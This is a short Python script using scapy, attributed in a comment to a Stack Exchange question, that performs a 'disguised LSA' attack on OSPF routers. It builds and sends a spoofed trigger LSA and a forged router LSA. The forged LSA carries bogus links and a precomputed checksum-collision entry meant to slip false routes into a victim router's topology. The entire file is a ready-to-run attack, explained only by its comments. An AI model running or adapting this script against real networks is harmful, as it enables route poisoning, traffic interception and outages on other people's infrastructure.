#!/usr/bin/env python

# script taken from
# https://security.stackexchange.com/questions/31415/how-to-conduct-a-disguised-lsa-attack-against-ospf

from scapy.all import *

load_contrib("ospf")

#from ospf import *
from time import sleep,clock,time

def ourSend(packet):
    sendp(packet,iface='eth0')     # is 192.168.184.131
#    sleep(2)

def ourSend2(packet):
    sendp(packet,iface='eth1') # is 192.168.57.20
#    sleep(2)


victim='172.16.1.1'          #This is the IP address of interface through which the victim will receive the trigger LSA. 
victimId='1.1.1.1'           #This the router ID of the victim router.
victimNeighbor='172.16.1.2'  #This is the IP address of a neighbor of the victim router to which the disguised LSA is sent
spoofSRC='192.168.184.131'           #This is an IP address of one of the neighbors of the victim. It is used as a spoofed IP 

host1='192.168.1.0'      #This will used in the bogus Link entries in the disguised LSA.
host2='192.168.2.0'      #This will used in the bogus Link entries in the disguised LSA.
sequence=7               #The sequence number of the disguised LSA

#The bogus Link entries to be included in the disguised LSA. The contents of the last link (collisionLink) is chosen 
# so that the LSA will have a specific checksum desirable to our network example (0x2028 in this example). The contents of this link has been
# calculated offline.  
link2host1 = OSPF_Link(id=host1,data='255.255.255.255',type=3)
link2host2 = OSPF_Link(id=host2,data='255.255.255.255',type=3)
link2victim = OSPF_Link(id=victimId,data=victim,type=2)
collisionLink = OSPF_Link(id='0.0.0.0',data='0.0.0.0',type=0,toscount=27,metric=156)

# Build the trigger LSA. Note that it is sent with sequence number that is smaller by one from the sequence of the disguised packet.
IPlayer=IP(src=spoofSRC,dst=victim)
OSPFHdr=OSPF_Hdr(src=spoofSRC)
trigger=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence-1,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2])])

#Buid the disguised LSA
IPlayer=IP(src=victim,dst=victimNeighbor)
OSPFHdr=OSPF_Hdr(src=victimId)
disguisedLsa=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2,collisionLink])])
#Send them both 
ourSend(trigger)
ourSend2(disguisedLsa)
